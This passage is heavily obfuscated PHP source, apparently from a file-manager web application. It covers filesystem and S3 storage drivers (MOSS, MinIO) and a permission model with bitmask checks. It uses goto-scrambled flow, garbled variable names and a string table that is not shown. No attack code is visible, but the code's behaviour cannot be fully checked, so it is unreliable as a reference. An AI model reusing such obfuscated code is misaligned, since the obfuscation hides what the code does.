(!$this->delFolder($b„ê¿èˆ¦µ)) { return !1; } } } closedir($a±©¬£š¤ˆ); goto DÔ¼Ï§ßˆ; AÒò¦È‰Ú: $C’èì”‹ÕÍ =& $_SERVER[°Óó£ÌİóèÅ]; $eéêô¼” = $this->iconvSystem($eéêô¼”); if (!is_dir($eéêô¼”)) { return !0; } goto A‡ËÁ‘; DÔ¼Ï§ßˆ: return rmdir($eéêô¼”); goto F¥Ó¹ÑªÍ§; F¥Ó¹ÑªÍ§: } public function rename($FºøËïôĞÒ, $c³¾„†Œí) { goto A‹‹¦ºĞóã; CØØ…É÷¾²: $FºøËïôĞÒ = $this->iconvSystem($FºøËïôĞÒ); $föåª‚¥¨ = $this->pathFather($FºøËïôĞÒ); $F¶¼‹ª£ÖÀ = rtrim($föåª‚¥¨, $c™Ò¨ğÀÍÚ[8]) . $c™Ò¨ğÀÍÚ[8] . $bÇäæÁæ÷; goto fÕ¼°ÄÒßÙ; fÕ¼°ÄÒßÙ: $CùóÊŒã— = @rename($FºøËïôĞÒ, $F¶¼‹ª£ÖÀ); $F¶¼‹ª£ÖÀ = $this->iconvApp($F¶¼‹ª£ÖÀ); return $CùóÊŒã— ? $this->getPathOuter($F¶¼‹ª£ÖÀ) : !1; goto a£Áî®­‡£; A‹‹¦ºĞóã: $c™Ò¨ğÀÍÚ =& $_SERVER[°Óó£ÌİóèÅ]; $bÇäæÁæ÷ = $this->fileNameAuto($this->pathFather($FºøËïôĞÒ), $c³¾„†Œí); $bÇäæÁæ÷ = $this->iconvSystem($bÇäæÁæ÷); goto CØØ…É÷¾²; a£Áî®­‡£: } public function _size($E´ÀùÑ’–ì) { $E´ÀùÑ’–ì = $this->iconvSystem($E´ÀùÑ’–ì); return (double) abs(sprintf($_SERVER[°Óó£ÌİóèÅ][898], @filesize($E´ÀùÑ’–ì))); } public function _info($A‚õ¥–Ø•º) { $A‚õ¥–Ø•º = $this->iconvSystem($A‚õ¥–Ø•º); if ($this->_isFolder($A‚õ¥–Ø•º)) { return $this->folderInfo($A‚õ¥–Ø•º); } else { if ($this->_isFile($A‚õ¥–Ø•º)) { return $this->fileInfo($A‚õ¥–Ø•º); } } return !1; } protected function infoChildren($AÀßÌ«©ÙÎ, &$bÊÜ±ƒ²Şî, $E°¡ƒöˆô = true) { $CàË•°‘ëï =& $_SERVER[°Óó£ÌİóèÅ]; $AÀßÌ«©ÙÎ = rtrim($AÀßÌ«©ÙÎ, $CàË•°‘ëï[8]) . $CàË•°‘ëï[8]; if ($E°¡ƒöˆô) { check_abort(); $AÀßÌ«©ÙÎ = $this->iconvSystem($AÀßÌ«©ÙÎ); } if (!($B£Ö£ˆÜ›À = @opendir($AÀßÌ«©ÙÎ))) { return; } while (($b²ëˆôƒ®§ = readdir($B£Ö£ˆÜ›À)) !== !1) { if ($b²ëˆôƒ®§ == $CàË•°‘ëï[100] || $b²ëˆôƒ®§ == $CàË•°‘ëï[897]) { continue; } $E©›•ËŒ¨¡ = $AÀßÌ«©ÙÎ . $b²ëˆôƒ®§; if (is_file($E©›•ËŒ¨¡)) { $bÊÜ±ƒ²Şî[$CàË•°‘ëï[87]]++; $bÊÜ±ƒ²Şî[$CàË•°‘ëï[86]] += (double) abs(sprintf($CàË•°‘ëï[898], @filesize($E©›•ËŒ¨¡))); } else { $bÊÜ±ƒ²Şî[$CàË•°‘ëï[88]]++; $this->infoChildren($E©›•ËŒ¨¡, $bÊÜ±ƒ²Şî, !1); } } closedir($B£Ö£ˆÜ›À); } private function folderInfo($có°™µÉ, $E‚Í ³¼’© = false) { $eÔÏÍôŒ± =& $_SERVER[°Óó£ÌİóèÅ]; $có°™µÉ = rtrim($có°™µÉ, $eÔÏÍôŒ±[8]) . $eÔÏÍôŒ±[8]; $D±¥ò¿¹³ = $this->iconvApp($this->pathThis($có°™µÉ)); if ($E‚Í ³¼’©) { return array($eÔÏÍôŒ±[28] => $D±¥ò¿¹³, $eÔÏÍôŒ±[84] => $this->getPathOuter($có°™µÉ), $eÔÏÍôŒ±[29] => $eÔÏÍôŒ±[85]); } $EÃÎŞ¢´ğ = array($eÔÏÍôŒ±[28] => $D±¥ò¿¹³, $eÔÏÍôŒ±[84] => $this->getPathOuter($có°™µÉ), $eÔÏÍôŒ±[29] => $eÔÏÍôŒ±[85], $eÔÏÍôŒ±[195] => @filectime($có°™µÉ), $eÔÏÍôŒ±[114] => @filemtime($có°™µÉ), $eÔÏÍôŒ±[899] => @fileatime($có°™µÉ), $eÔÏÍôŒ±[894] => is_readable($có°™µÉ), $eÔÏÍôŒ±[895] => is_writable($có°™µÉ), $eÔÏÍôŒ±[900] => get_mode($có°™µÉ)); return $EÃÎŞ¢´ğ; } private function fileInfo($C®®ÉÏÁ´, $C¸İôù…È = false) { $aÒ¯‡š´ñ— =& $_SERVER[°Óó£ÌİóèÅ]; $AÙ´Ã£Œ÷Á = $this->iconvApp($this->pathThis($C®®ÉÏÁ´)); if ($C¸İôù…È) { return array($aÒ¯‡š´ñ—[28] => $AÙ´Ã£Œ÷Á, $aÒ¯‡š´ñ—[84] => $this->getPathOuter($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[29] => $aÒ¯‡š´ñ—[172], $aÒ¯‡š´ñ—[86] => $this->size($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[165] => $this->ext($AÙ´Ã£Œ÷Á)); } $AœÏñÀÒ = array($aÒ¯‡š´ñ—[28] => $AÙ´Ã£Œ÷Á, $aÒ¯‡š´ñ—[84] => $this->getPathOuter($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[29] => $aÒ¯‡š´ñ—[172], $aÒ¯‡š´ñ—[195] => @filectime($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[114] => @filemtime($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[899] => @fileatime($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[86] => $this->size($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[165] => $this->ext($AÙ´Ã£Œ÷Á), $aÒ¯‡š´ñ—[894] => is_readable($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[895] => is_writable($C®®ÉÏÁ´), $aÒ¯‡š´ñ—[900] => get_mode($C®®ÉÏÁ´)); $this->fileInfoImage($C®®ÉÏÁ´, $AœÏñÀÒ); return $AœÏñÀÒ; } public function exist($cÈ™‚Ó°´) { $cÈ™‚Ó°´ = $this->iconvSystem($cÈ™‚Ó°´); return @file_exists($cÈ™‚Ó°´); } public function _isFile($côµóÍ²Ã¤) { $côµóÍ²Ã¤ = $this->iconvSystem($côµóÍ²Ã¤); return @is_file($côµóÍ²Ã¤); } public function _isFolder($dáÇí–ß¯™) { $dáÇí–ß¯™ = $this->iconvSystem($dáÇí–ß¯™); return @is_dir($dáÇí–ß¯™); } public function size($E™Š‰·õŒ×) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][896], $E™Š‰·õŒ×); } public function info($EìŒÆù›¡) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][191], $EìŒÆù›¡); } public function isFile($D™……Åé•) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][192], $D™……Åé•); } public function isFolder($e·Ÿ›¹ª´é) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][193], $e·Ÿ›¹ª´é); } private function fileInfoImage($C¿Ğƒ§íñ¤, &$e¼¿â”µ¼¾) { $bïäÕ¤”  =& $_SERVER[°Óó£ÌİóèÅ]; $eáÔÖÀï› = array($bïäÕ¤” [216], $bïäÕ¤” [166], $bïäÕ¤” [217], $bïäÕ¤” [218], $bïäÕ¤” [219]); if (in_array($e¼¿â”µ¼¾[$bïäÕ¤” [165]], $eáÔÖÀï›)) { $A´‡İ½ËÉÔ = GetImageSize($C¿Ğƒ§íñ¤); if ($A´‡İ½ËÉÔ) { $e¼¿â”µ¼¾[$bïäÕ¤” [220]] = array($bïäÕ¤” [221] => $A´‡İ½ËÉÔ[0], $bïäÕ¤” [901] => $A´‡İ½ËÉÔ[1]); } } } public function listPath($d‡ˆ¶‡ƒ‹ë, $f…è®Û•ª = false) { goto FÊèÏâ¯¾Ã; BÁØ£µô‡Ù: $C®¸×¹êÛã = array($Eˆó«×Ñ¬°[83] => array(), $Eˆó«×Ñ¬°[82] => array()); if (!($a™İÂã¢Ç = @opendir($d‡ˆ¶‡ƒ‹ë))) { return $C®¸×¹êÛã; } while (($fŒ¯»×Ñ¶‚ = readdir($a™İÂã¢Ç)) !== !1) { if ($fŒ¯»×Ñ¶‚ == $Eˆó«×Ñ¬°[100] || $fŒ¯»×Ñ¶‚ == $Eˆó«×Ñ¬°[897]) { continue; } $CÁ§ÑÛ¯Ëù = $d‡ˆ¶‡ƒ‹ë . $fŒ¯»×Ñ¶‚; if (is_file($CÁ§ÑÛ¯Ëù)) { $C®¸×¹êÛã[$Eˆó«×Ñ¬°[82]][] = $this->fileInfo($CÁ§ÑÛ¯Ëù, $f…è®Û•ª); } else { $C®¸×¹êÛã[$Eˆó«×Ñ¬°[83]][] = $this->folderInfo($CÁ§ÑÛ¯Ëù, $f…è®Û•ª); } } goto DåîÊáÒªí; FÊèÏâ¯¾Ã: $Eˆó«×Ñ¬° =& $_SERVER[°Óó£ÌİóèÅ]; $d‡ˆ¶‡ƒ‹ë = $this->iconvSystem($d‡ˆ¶‡ƒ‹ë); $d‡ˆ¶‡ƒ‹ë = rtrim($d‡ˆ¶‡ƒ‹ë, $Eˆó«×Ñ¬°[8]) . $Eˆó«×Ñ¬°[8]; goto BÁØ£µô‡Ù; DåîÊáÒªí: closedir($a™İÂã¢Ç); return $C®¸×¹êÛã; goto aƒŠá¤çùø; aƒŠá¤çùø: } public function listAll($Føƒ²°§İé, &$bØ‡ØÄÄ‡† = array()) { goto C‰îîŒ‘¥; Dº·Û¥¸×: return $bØ‡ØÄÄ‡†; goto AÉÙŠÕì««; C‰îîŒ‘¥: $c›õ ïÔåÉ =& $_SERVER[°Óó£ÌİóèÅ]; $Føƒ²°§İé = $this->iconvSystem($Føƒ²°§İé); $Føƒ²°§İé = rtrim($Føƒ²°§İé, $c›õ ïÔåÉ[8]) . $c›õ ïÔåÉ[8]; goto b©ŒÙî…á‡; b©ŒÙî…á‡: if (!($Cç¯Ìæ¯±Ï = @opendir($Føƒ²°§İé))) { return $bØ‡ØÄÄ‡†; } while (($f­’µèµö = readdir($Cç¯Ìæ¯±Ï)) !== !1) { if ($f­’µèµö == $c›õ ïÔåÉ[100] || $f­’µèµö == $c›õ ïÔåÉ[897]) { continue; } $A«ÂÜ˜Û = $Føƒ²°§İé . $f­’µèµö; if (is_dir($A«ÂÜ˜Û)) { $bØ‡ØÄÄ‡†[] = array($c›õ ïÔåÉ[84] => $A«ÂÜ˜Û . $c›õ ïÔåÉ[8], $c›õ ïÔåÉ[85] => 1, $c›õ ïÔåÉ[86] => 0); $this->listAll($A«ÂÜ˜Û, $bØ‡ØÄÄ‡†); } else { $bØ‡ØÄÄ‡†[] = array($c›õ ïÔåÉ[84] => $A«ÂÜ˜Û, $c›õ ïÔåÉ[85] => 0, $c›õ ïÔåÉ[86] => $this->size($A«ÂÜ˜Û)); } } closedir($Cç¯Ìæ¯±Ï); goto Dº·Û¥¸×; AÉÙŠÕì««: } public function has($fÓ‰ÖÇôÉÇ, $D–å¤Ó‘ô = false, $CÙÆÖÙ¥ÀÌ = true) { goto bšì¬ììš; C¤­‘¥º­²: if (!($AÓå¶¥†íÑ = @opendir($fÓ‰ÖÇôÉÇ))) { return !1; } $BÖ‹‰ƒõÅŞ = 0; $aÕÄ™‹å¼Ÿ = 0; goto cêßó„“¨À; bšì¬ììš: $fÆ‰©Ì—ÈÑ =& $_SERVER[°Óó£ÌİóèÅ]; $fÓ‰ÖÇôÉÇ = $this->iconvSystem($fÓ‰ÖÇôÉÇ); $fÓ‰ÖÇôÉÇ = rtrim($fÓ‰ÖÇôÉÇ, $fÆ‰©Ì—ÈÑ[8]) . $fÆ‰©Ì—ÈÑ[8]; goto C¤­‘¥º­²; cêßó„“¨À: while (($C²²Ø­ëñì = readdir($AÓå¶¥†íÑ)) !== !1) { if ($C²²Ø­ëñì == $fÆ‰©Ì—ÈÑ[100] || $C²²Ø­ëñì == $fÆ‰©Ì—ÈÑ[897]) { continue; } $c‹Å«Íâ…™ = $fÓ‰ÖÇôÉÇ . $C²²Ø­ëñì; if ($D–å¤Ó‘ô) { if (@is_file($c‹Å«Íâ…™)) { $BÖ‹‰ƒõÅŞ++; } else { $aÕÄ™‹å¼Ÿ++; } continue; } if ($CÙÆÖÙ¥ÀÌ) { if (@is_file($c‹Å«Íâ…™)) { return !0; } } else { if (@is_dir($c‹Å«Íâ…™ . $fÆ‰©Ì—ÈÑ[8])) { return !0; } } } closedir($AÓå¶¥†íÑ); if ($D–å¤Ó‘ô) { return array($fÆ‰©Ì—ÈÑ[199] => $BÖ‹‰ƒõÅŞ, $fÆ‰©Ì—ÈÑ[200] => $aÕÄ™‹å¼Ÿ); } goto a¥ˆ­ñ‚ªÔ; a¥ˆ­ñ‚ªÔ: return !1; goto Cïé±É¥; Cïé±É¥: } public function hashSimple($dê¥á«Ã‘§) { goto Aö¡¤”ˆÄœ; E‹Ú¯è ©²: if ($B½÷ô›Æ¢† <= $Aâ¸±èéì‰ * $A¬Ô¢èôä) { return $this->hashMd5($dê¥á«Ã‘§) . $B½÷ô›Æ¢†; } $eºÖ‰›Ôâ = $a¹ÖëÖ÷¨¿[33]; $d‘ÇòæÌí = intval($B½÷ô›Æ¢† / $A¬Ô¢èôä); goto E–›”Ó¬„‹; E–›”Ó¬„‹: $bÈÃ‘•†˜­ = fopen($dê¥á«Ã‘§, $a¹ÖëÖ÷¨¿[902]); if (!$bÈÃ‘•†˜­) { return $eºÖ‰›Ôâ; } for ($D•š¾ˆÁ² = 0; $D•š¾ˆÁ² < $A¬Ô¢èôä; $D•š¾ˆÁ²++) { fseek($bÈÃ‘•†˜­, $d‘ÇòæÌí * $D•š¾ˆÁ²); $eºÖ‰›Ôâ .= fread($bÈÃ‘•†˜­, $Aâ¸±èéì‰); } goto cò‚¦åÔŞ; cò‚¦åÔŞ: fseek($bÈÃ‘•†˜­, $B½÷ô›Æ¢† - $Aâ¸±èéì‰); $eºÖ‰›Ôâ .= fread($bÈÃ‘•†˜­, $Aâ¸±èéì‰); fclose($bÈÃ‘•†˜­); goto cÍ„¯Úà¥ë; c†±¡¹µÕç: $B½÷ô›Æ¢† = $this->size($dê¥á«Ã‘§); $Aâ¸±èéì‰ = 200; $A¬Ô¢èôä = 50; goto E‹Ú¯è ©²; Aö¡¤”ˆÄœ: $a¹ÖëÖ÷¨¿ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$dê¥á«Ã‘§) { return md5($a¹ÖëÖ÷¨¿[33]); } $dê¥á«Ã‘§ = $this->iconvSystem($dê¥á«Ã‘§); goto c†±¡¹µÕç; cÍ„¯Úà¥ë: return md5($eºÖ‰›Ôâ) . $B½÷ô›Æ¢†; goto F£…™’£Ñİ; F£…™’£Ñİ: } public function getContent($f­£ä›á—) { $f­£ä›á— = $this->iconvSystem($f­£ä›á—); return file_get_contents($f­£ä›á—); } public function setContent($b¨Ø¨ôãœâ, $A·åÅ­Øé = '') { $b¨Ø¨ôãœâ = $this->iconvSystem($b¨Ø¨ôãœâ); return file_put_contents($b¨Ø¨ôãœâ, $A·åÅ­Øé, LOCK_EX); } public function fileSubstr($B—È™ãõ•¬, $A±ŸÏƒÆ = 0, $c„ŞÈŒ‰£– = false) { goto fÆ®Œ¨™; a¥–›•˜éñ: if ($c„ŞÈŒ‰£– <= 0) { return $AÒÖôî[33]; } $c³ŠÀ™£ãƒ = fopen($B—È™ãõ•¬, $AÒÖôî[902]); if (!$c³ŠÀ™£ãƒ) { return !1; } goto F¯çˆ˜×ß; F¯çˆ˜×ß: fseek($c³ŠÀ™£ãƒ, $A±ŸÏƒÆ); $bß±˜÷ç˜ = fread($c³ŠÀ™£ãƒ, $c„ŞÈŒ‰£–); fclose($c³ŠÀ™£ãƒ); goto cÒ‘Šƒ²ïâ; cÒ‘Šƒ²ïâ: return $bß±˜÷ç˜; goto Eœ³©õÃ†ø; fÆ®Œ¨™: $AÒÖôî =& $_SERVER[°Óó£ÌİóèÅ]; $B—È™ãõ•¬ = $this->iconvSystem($B—È™ãõ•¬); if ($c„ŞÈŒ‰£– === !1) { $c„ŞÈŒ‰£– = $this->size($B—È™ãõ•¬); } goto a¥–›•˜éñ; Eœ³©õÃ†ø: } public function upload($fÛî¼”Å¶†, $D˜›¯‚ãõŞ, $D‚™çåš°¥ = false, $CŸŠ§Õö¥ = REPEAT_REPLACE) { $B³¿ÜìÑÜ× = $this->copyFile($D˜›¯‚ãõŞ, $fÛî¼”Å¶†); return $B³¿ÜìÑÜ× ? $this->getPathOuter($fÛî¼”Å¶†) : !1; } public function download($C§ò‚ã‘, $AŒ¿å·Ì‚Ã) { return $this->iconvSystem($C§ò‚ã‘); } } class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($EÁ«”‹Ù¸) { parent::__construct($EÁ«”‹Ù¸); $this->signatureVersion($_SERVER[°Óó£ÌİóèÅ][208]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($Dé†±Ó–“, $B‡§õ»¯À, $bŒä„ó®õ = array()) { $Aõ¼Üå¶ò = $this->tempFile($Dé†±Ó–“); $this->download($Dé†±Ó–“, $Aõ¼Üå¶ò); $bÀêæ†æÏ = $this->upload($B‡§õ»¯À, $Aõ¼Üå¶ò); $this->tempFileRemve($Aõ¼Üå¶ò); return $bÀêæ†æÏ; } public function uploadFormData($fŒñ¦“Ğ‹Š, $eÚòâŞ¯‘Ê = 3600) { return parent::uploadFormData($fŒñ¦“Ğ‹Š, $eÚòâŞ¯‘Ê); } public function fileOut($cËá®‰Ğ, $a¿ø×·¢˜ô = false, $B”‰‹ã½¸— = false, $EšÃêïÈƒ = '') { parent::fileOutServer($cËá®‰Ğ, $a¿ø×·¢˜ô, $B”‰‹ã½¸—, $EšÃêïÈƒ); } public function fileOutLink($fÖ¥¿Á¸İ·) { header($_SERVER[°Óó£ÌİóèÅ][161] . $fÖ¥¿Á¸İ·); die; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fäÈœ²ÊçØ) { parent::__construct($fäÈœ²ÊçØ); $this->signatureVersion($_SERVER[°Óó£ÌİóèÅ][208]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function _isFolder($D§Ô¥ì¹Ãœ) { $Eá‰ÉÀíî­ =& $_SERVER[°Óó£ÌİóèÅ]; $D§Ô¥ì¹Ãœ = trim($D§Ô¥ì¹Ãœ, $Eá‰ÉÀíî­[8]); if (!empty($D§Ô¥ì¹Ãœ)) { $D§Ô¥ì¹Ãœ .= $Eá‰ÉÀíî­[8]; } if ($this->getObjectInfo($D§Ô¥ì¹Ãœ)) { return !0; } return parent::_isFolder($D§Ô¥ì¹Ãœ); } public function fileOutLink($aĞ‹õÁåºö) { header($_SERVER[°Óó£ÌİóèÅ][161] . $aĞ‹õÁåºö); die; } } goto eÆáÁ¹Şğ; eÃÇôĞ¼•: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $FÇøèéÛŠ³ =& $_SERVER[°Óó£ÌİóèÅ]; $A¨›ÂÊˆ…· = array(array($FÇøèéÛŠ³[395] => LNG($FÇøèéÛŠ³[1547]), $FÇøèéÛŠ³[1548] => $FÇøèéÛŠ³[1549], $FÇøèéÛŠ³[1550] => 6, $FÇøèéÛŠ³[1551] => 1, $FÇøèéÛŠ³[1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($FÇøèéÛŠ³[395] => LNG($FÇøèéÛŠ³[1553]), $FÇøèéÛŠ³[1548] => $FÇøèéÛŠ³[1554], $FÇøèéÛŠ³[1550] => 1, $FÇøèéÛŠ³[1551] => 1, $FÇøèéÛŠ³[1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÇøèéÛŠ³[395] => LNG($FÇøèéÛŠ³[1555]), $FÇøèéÛŠ³[1548] => $FÇøèéÛŠ³[1556], $FÇøèéÛŠ³[1550] => 2, $FÇøèéÛŠ³[1551] => 1, $FÇøèéÛŠ³[1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÇøèéÛŠ³[395] => LNG($FÇøèéÛŠ³[1557]), $FÇøèéÛŠ³[1548] => $FÇøèéÛŠ³[1556], $FÇøèéÛŠ³[1550] => 3, $FÇøèéÛŠ³[1551] => 1, $FÇøèéÛŠ³[1552] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÇøèéÛŠ³[395] => LNG($FÇøèéÛŠ³[1558]), $FÇøèéÛŠ³[1548] => $FÇøèéÛŠ³[1559], $FÇøèéÛŠ³[1550] => 4, $FÇøèéÛŠ³[1551] => 1, $FÇøèéÛŠ³[1552] => self::AUTH_SHOW | self::AUTH_VIEW), array($FÇøèéÛŠ³[395] => LNG($FÇøèéÛŠ³[1560]), $FÇøèéÛŠ³[1548] => $FÇøèéÛŠ³[1561], $FÇøèéÛŠ³[1550] => 5, $FÇøèéÛŠ³[1551] => 1, $FÇøèéÛŠ³[1552] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($FÇøèéÛŠ³[395] => LNG($FÇøèéÛŠ³[1562]), $FÇøèéÛŠ³[1548] => $FÇøèéÛŠ³[1563], $FÇøèéÛŠ³[1550] => 7, $FÇøèéÛŠ³[1551] => 1, $FÇøèéÛŠ³[1552] => 0)); return $A¨›ÂÊˆ…·; } public static function authCheck($b±™ÑÙŸí, $a¸­¬Ù·Ğ) { $b±™ÑÙŸí = intval($b±™ÑÙŸí); if ($GLOBALS[$_SERVER[°Óó£ÌİóèÅ][1030]]) { return !0; } if ($b±™ÑÙŸí <= 0) { return !1; } if (($b±™ÑÙŸí & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($b±™ÑÙŸí & $a¸­¬Ù·Ğ); } public static function authCheckShow($e®¾¶¼®…) { return self::authCheck($e®¾¶¼®…, self::AUTH_SHOW); } public static function authCheckView($C‘Œùœéèò) { return self::authCheck($C‘Œùœéèò, self::AUTH_VIEW); } public static function authCheckDownload($AğĞ½ ãÜµ) { return self::authCheck($AğĞ½ ãÜµ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($E¿ÏßÕ¬ñİ) { return self::authCheck($E¿ÏßÕ¬ñİ, self::AUTH_UPLOAD); } public static function authCheckEdit($Déââ†¹‘Ş) { return self::authCheck($Déââ†¹‘Ş, self::AUTH_EDIT); } public static function authCheckRemove($eÅ®±Š´¬×) { return self::authCheck($eÅ®±Š´¬×, self::AUTH_REMOVE); } public static function authCheckShare($dÇ†®¶•áØ) { return self::authCheck($dÇ†®¶•áØ, self::AUTH_SHARE); } public static function authCheckComment($a°Ùã«ÏÑ) { return self::authCheck($a°Ùã«ÏÑ, self::AUTH_COMMENT); } public static function authCheckEvent($F«Şßò„ÍÈ) { return self::authCheck($F«Şßò„ÍÈ, self::AUTH_EVENT); } public static function authCheckRoot($B¬òİì¾ö) { return self::authCheck($B¬òİì¾ö, self::AUTH_ROOT); } public static function authDisable($dñŞ‚‹‚¤, $cØÀÛ‹µÓĞ) { if (intval($dñŞ‚‹‚¤) <= 0) { return 0; } return intval($dñŞ‚‹‚¤) & ~$cØÀÛ‹µÓĞ; } public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x73\157\x75\162\x63\145\101\x75\164\150\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x61\x75\164\x68", "\x6c\141\142\145\x6c", "\x64\151\163\x70\x6c\141\171", "\163\171\163\164\145\155", "\163\x6f\x72\x74"); public function initData() { $A·ß’ˆÚ = $this->authDefault(); foreach ($A·ß’ˆÚ as $fÍªõ¤à¡ğ) { $this->add($fÍªõ¤à¡ğ); } } public function listData($E¸ºåÒ¬ñ = false, $F¡»êÁÜ† = "\163\157\x72\164", $CÂ†ŞŠ«Ö˜ = false) { return parent::listData($E¸ºåÒ¬ñ, $F¡»êÁÜ†, $CÂ†ŞŠ«Ö˜); } public function update($dÜêä¸òöÑ, $fŒ÷êéÁè) { $cƒ±Ûí‰Ë =& $_SERVER[°Óó£ÌİóèÅ]; $B¿Éƒ³Šºã = parent::listData($dÜêä¸òöÑ); $FœÛÖâ’–Â = $this->findByName($fŒ÷êéÁè[$cƒ±Ûí‰Ë[28]]); if (!$B¿Éƒ³Šºã || $FœÛÖâ’–Â && $FœÛÖâ’–Â[$cƒ±Ûí‰Ë[376]] != $B¿Éƒ³Šºã[$cƒ±Ûí‰Ë[376]]) { return !1; } $this->filterAuth($fŒ÷êéÁè[$cƒ±Ûí‰Ë[557]]); return parent::update($dÜêä¸òöÑ, $fŒ÷êéÁè); } public function remove($B™¬ùºöçß) { $dªÅ…²® = parent::listData($B™¬ùºöçß); if (!$dªÅ…²® || $dªÅ…²®[$_SERVER[°Óó£ÌİóèÅ][824]]) { return !1; } return parent::remove($B™¬ùºöçß); } public function add($DÈè¸º¢Ê¯ = array()) { goto aŸõÖßáñô; c×‰˜Ñ˜¡: return parent::insert($DÈè¸º¢Ê¯); goto b¢†¦™‘¿¿; aŸõÖßáñô: $E¹éÌ†ã¾ =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->findByName($DÈè¸º¢Ê¯[$E¹éÌ†ã¾[28]])) { return !1; } $a‹¢Ôù¸•à = array($E¹éÌ†ã¾[28] => $E¹éÌ†ã¾[33], $E¹éÌ†ã¾[557] => 1, $E¹éÌ†ã¾[1564] => $E¹éÌ†ã¾[1565], $E¹éÌ†ã¾[1566] => 1, $E¹éÌ†ã¾[824] => 0, $E¹éÌ†ã¾[1567] => 0); goto bé•×Ğ¿Á; bé•×Ğ¿Á: $DÈè¸º¢Ê¯ = array_merge($a‹¢Ôù¸•à, $DÈè¸º¢Ê¯); $DÈè¸º¢Ê¯[$E¹éÌ†ã¾[1567]] = $this->getSort(); $this->filterAuth($DÈè¸º¢Ê¯[$E¹éÌ†ã¾[557]]); goto c×‰˜Ñ˜¡; b¢†¦™‘¿¿: } private function getSort() { $dÚœÚ‰±È =& $_SERVER[°Óó£ÌİóèÅ]; $B–—Ö„à«Û = parent::listData(); $CìÕ‘œ†ˆ˜ = array_to_keyvalue($B–—Ö„à«Û, $dÚœÚ‰±È[33], $dÚœÚ‰±È[1567]); return empty($CìÕ‘œ†ˆ˜) ? 0 : max($CìÕ‘œ†ˆ˜) + 1; } private function filterAuth(&$BŒ‘õëƒ–˜) { goto d‡¢“ÔÍ«; b¦ç÷–Ÿ§¾: foreach ($D™ãã¤ÚÜ½ as $C³ğ’ÀëôÎ) { if (isset($bÔìªì‡ˆ­[$C³ğ’ÀëôÎ])) { $D™ãã¤ÚÜ½ = array_merge($D™ãã¤ÚÜ½, $bÔìªì‡ˆ­[$C³ğ’ÀëôÎ]); } } $D™ãã¤ÚÜ½[] = self::AUTH_SHOW; $BŒ‘õëƒ–˜ = array_sum(array_unique($D™ãã¤ÚÜ½)); goto cµÁ¯®âÇ»; d‡¢“ÔÍ«: if (!$BŒ‘õëƒ–˜) { return; } $F¶¯é¤— Ç = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $D™ãã¤ÚÜ½ = array(); goto b›ŒÄ’ùÉ; b›ŒÄ’ùÉ: foreach ($F¶¯é¤— Ç as $C³ğ’ÀëôÎ) { if ($BŒ‘õëƒ–˜ & $C³ğ’ÀëôÎ) { $D™ãã¤ÚÜ½[] = $C³ğ’ÀëôÎ; } } if (in_array(self::AUTH_ROOT, $D™ãã¤ÚÜ½)) { $BŒ‘õëƒ–˜ = array_sum($F¶¯é¤— Ç); return; } $bÔìªì‡ˆ­ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto b¦ç÷–Ÿ§¾; cµÁ¯®âÇ»: } public function sort($b…ÄˆŒ¸èï, $dÁ£Š½Â™‡) { return parent::update($b…ÄˆŒ¸èï, $dÁ£Š½Â™‡); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x62\141\143\153\165\160\114\x69\163\x74"; public $field = array("\x69\x6f", "\x6e\x61\x6d\145", "\x73\x74\x61\x74\x75\163", "\143\157\156\164\x65\156\164", "\162\x65\x73\x75\x6c\x74", "\164\151\155\x65\x46\x72\157\x6d", "\x74\151\155\x65\124\157"); public function 